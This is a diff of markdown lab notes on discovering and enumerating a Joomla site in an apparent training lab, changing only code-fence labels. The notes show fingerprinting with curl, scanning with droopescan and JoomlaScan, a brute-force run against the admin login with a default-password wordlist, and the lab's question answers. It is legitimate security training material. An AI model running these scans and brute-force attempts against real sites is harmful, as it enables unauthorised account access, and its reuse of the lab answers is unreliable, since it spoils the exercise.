@@ -1,7 +1,7 @@
 # Joomla - Discovery & Enumeration
 ## Discovery/Footprinting
 
-```sh
+```shellsession
 $ curl -s http://dev.inlanefreight.local/ | grep Joomla
 
     <meta name="generator" content="Joomla! - Open Source Content Management" />
@@ -12,7 +12,7 @@ $ curl -s http://dev.inlanefreight.local/ | grep Joomla
 
 We can fingerprint the Joomla version if the README.txt file is present.
 
-```sh
+```shellsession
 $ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
 
 1- What is this?
@@ -25,7 +25,7 @@ $ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
 ## Enumeration
 Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
 
-```sh
+```shellsession
 $ sudo pip3 install droopescan
 
 Collecting droopescan
@@ -60,7 +60,7 @@ $ droopescan scan joomla --url http://dev.inlanefreight.local/
 
 We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool.
 
-```sh
+```shellsession
 $ python2 -m pip install bs4
 $ python2 joomlascan.py -u http://dev.inlanefreight.local
 
@@ -99,7 +99,7 @@ Component found: com_banners     > http://dev.inlanefreight.local/index.php?opti
 
 The default administrator account on Joomla installs is `admin`, but the password is set at install time. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.
 
-```sh
+```shellsession
 $ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
  
 admin:admin
@@ -108,7 +108,7 @@ admin:admin
 ## Questions
 1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x) **Answer: 3.10.0**
    - Run droopescan to identify Joomla version:
-        ```sh
+        ```shellsession
         $ droopescan scan joomla --url http://app.inlanefreight.local
         [+] Possible version(s):                                                        
             3.10.0-alpha1
@@ -123,7 +123,7 @@ admin:admin
         ```
 2. Find the password for the admin user on http://app.inlanefreight.local **Answer: turnkey**
    - Run the bruteforce script with default passwords list:
-        ```sh
+        ```shellsession
         $ sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
         admin:turnkey
         ```
